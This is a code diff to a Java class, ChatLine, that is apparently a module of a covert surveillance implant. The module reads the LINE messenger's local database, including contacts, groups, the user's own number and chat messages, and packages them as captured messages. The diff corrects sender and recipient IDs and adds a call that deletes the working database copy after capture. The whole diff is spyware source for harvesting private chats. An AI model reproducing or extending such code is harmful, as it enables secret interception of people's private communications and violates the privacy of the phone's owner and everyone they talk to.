@@ -51,13 +51,7 @@ public class ChatLine extends SubModuleChat {
 
 	@Override
 	void notifyStopProgram(String processName) {
-		try {
-			readLineMessageHistory();
-		} catch (IOException e) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notifyStopProgram) Error: " + e);
-			}
-		}
+		start();
 	}
 
 	@Override
@@ -93,6 +87,8 @@ public class ChatLine extends SubModuleChat {
 				markup.serialize(lastmessage);
 			}
 
+			helper.deleteDb();
+
 		} catch (IOException e) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notifyStopProgram) Error: " + e);
@@ -105,7 +101,7 @@ public class ChatLine extends SubModuleChat {
 
 	private String readMyPhoneNumber() {
 
-		//SQLiteDatabase db = helper.getReadableDatabase();
+		// SQLiteDatabase db = helper.getReadableDatabase();
 
 		RecordHashPairVisitor visitorContacts = new RecordHashPairVisitor("m_id", "name");
 		helper.traverseRecords("contacts", visitorContacts);
@@ -172,10 +168,11 @@ public class ChatLine extends SubModuleChat {
 
 					boolean incoming = false;
 					String to = account;
-					String to_id = from_mid;
+					String to_id = account_mid;
 
 					if (from_name == null) {
 						from_name = account;
+						from_mid = account_mid;
 						incoming = false;
 						to = groups.getGroupToName(from_name, chat_id);
 						to_id = groups.getGroupToId(from_name, chat_id);
@@ -193,7 +190,8 @@ public class ChatLine extends SubModuleChat {
 								date.toLocaleString(), content, from_name, to);
 					}
 
-					MessageChat message = new MessageChat(PROGRAM, date, from_mid, from_name, to_id, to, content, incoming);
+					MessageChat message = new MessageChat(PROGRAM, date, from_mid, from_name, to_id, to, content,
+							incoming);
 					messages.add(message);
 
 					return created_time;
@@ -217,7 +215,7 @@ public class ChatLine extends SubModuleChat {
 	}
 
 	private ChatGroups getLineGroups(GenericSqliteHelper helper) {
-		//SQLiteDatabase db = helper.getReadableDatabase();
+		// SQLiteDatabase db = helper.getReadableDatabase();
 		final ChatGroups groups = new ChatGroups();
 		RecordVisitor visitor = new RecordVisitor() {
 
@@ -226,7 +224,7 @@ public class ChatLine extends SubModuleChat {
 				String key = cursor.getString(0);
 				String mid = cursor.getString(1);
 				String name = cursor.getString(2);
-				if(mid == null){
+				if (mid == null) {
 					return 0;
 				}
 
